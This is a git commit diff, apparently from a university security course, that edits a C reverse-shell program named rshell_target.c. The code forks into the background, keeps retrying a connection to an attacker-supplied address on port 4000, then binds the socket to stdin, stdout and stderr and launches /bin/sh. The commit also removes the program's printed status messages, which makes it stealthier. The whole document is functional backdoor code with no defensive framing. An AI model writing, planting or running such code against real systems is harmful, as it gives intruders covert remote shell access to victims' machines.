c5b59f303d6d7c280baa172bdd9f55e65af0c513
comp6447 <wezham1@gmail.com>
2019-08-10 20:11:26 +1000

    should be working

--- src/bin/rshell_target.c
+++ src/bin/rshell_target.c
@@ -5,48 +5,45 @@
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <errno.h>
 
-#define REMOTE_PORT 2000
-#define POLL_DURATION 10
+
+#define REMOTE_PORT 4000
+#define POLL_DURATION 2
 
 int attempt_connection_to_server(char * remote_address);
-void execute_shell(int socket_fd);
+void execute_shell(int sock);
 
 int main(int argc, char** argv)
 {
     char * remote_address;
+    int sock, pid;
 	if(argc == 2)
     {
         remote_address = argv[1];
 	}
 	else
     {
-        printf("ERROR NO REMOTE SUPPLIED\n");
         exit(1);
 	}
-    
-	int sock, pid;
+    	
     pid = fork();
     if(pid == 0){
-         while( (sock = attempt_connection_to_server(remote_address)) == -1)
+        while( (sock = attempt_connection_to_server(remote_address)) == -1)
         {
-            printf("Sleeping\n");
             sleep(POLL_DURATION);
         }
-        
         execute_shell(sock);
     }   
 	return 1;
 }
 
-void execute_shell(int socket_fd)
-{
-    dup2(socket_fd, 0); //stdin
-    dup2(socket_fd, 1); //stdout
-    dup2(socket_fd, 2); //stderr
+void execute_shell(int sock){
+    dup2(sock, 0); //stdin
+    dup2(sock, 1); //stdout
+    dup2(sock, 2); //stderr
 
-    char *argv[1] = {"/bin/sh"};
-    execve(argv[0], argv, NULL);
+    system("/bin/sh");
 }
 
 int attempt_connection_to_server(char *remote_address){
@@ -64,12 +61,10 @@ int attempt_connection_to_server(char *remote_address){
     }
 
     int connection_failed = 1;
-
     if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) == -1)
     {
 		close(sock);
 		return -1;
     }
-
 	return sock;
 }
